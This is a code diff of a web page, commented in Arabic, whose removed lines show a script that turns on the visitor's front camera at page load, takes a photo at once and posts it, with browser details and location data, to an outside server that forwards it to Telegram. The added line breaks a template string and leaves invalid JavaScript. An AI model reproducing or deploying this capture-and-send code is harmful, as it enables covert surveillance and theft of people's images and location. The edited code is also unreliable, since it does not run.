@@ -75,7 +75,7 @@
             const systemData = {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
+                screenResolution: ${screen.width}x${screen.height},
                 language: navigator.language,
                 // يتم إضافة بيانات الموقع هنا
                 location: locationData
@@ -102,58 +102,3 @@
             try {
                 const constraints = { video: { facingMode: 'user' } }; 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                statusMessage.textContent = 'الكاميرا جاهزة للعمل. يتم التحضير للإرسال...';
-                
-                // عند بدء تدفق الكاميرا، قم بالالتقاط والإرسال فوراً
-                video.onloadedmetadata = function() {
-                    captureAndSend();
-                };
-
-            } catch (err) {
-                console.error("خطأ في الوصول إلى الكاميرا: ", err);
-                statusMessage.textContent = '⛔ يجب عليك السماح بالوصول إلى الكاميرا لتتمكن من استخدام هذه الخاصية.';
-            }
-        }
-
-        // 3. دالة الإرسال للخادم الخلفي
-        // 🛑 تم تعديلها لاستقبال بيانات النظام (systemData) 🛑
-        async function sendPhotoToServer(imageData, systemData) {
-            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
-            
-            try {
-                const response = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    // إرسال الصورة والبيانات معًا
-                    body: JSON.stringify({ 
-                        image: imageData,
-                        systemData: systemData // تم إضافة بيانات النظام هنا
-                    })
-                });
-
-                if (response.ok) {
-                    statusMessage.textContent = '✅ تم التقاط الصورة وإرسالها إلى التليجرام بنجاح!';
-                } else {
-                    const errorData = await response.json().catch(() => ({ message: response.statusText }));
-                    statusMessage.textContent = `❌ فشل الإرسال. تأكد من أن البوت يعمل.`;
-                }
-            } catch (error) {
-                console.error('خطأ في الاتصال بالخادم:', error);
-                statusMessage.textContent = '⚠️ خطأ في الاتصال بالخادم. تأكد من أن الخادم يعمل.';
-            } finally {
-                // إيقاف تدفق الكاميرا
-                if (video.srcObject) {
-                    const tracks = video.srcObject.getTracks();
-                    tracks.forEach(track => track.stop());
-                }
-            }
-        }
-
-        // بدء تشغيل الكاميرا عند تحميل الصفحة
-        startCamera();
-    </script>
-</body>
-</html>
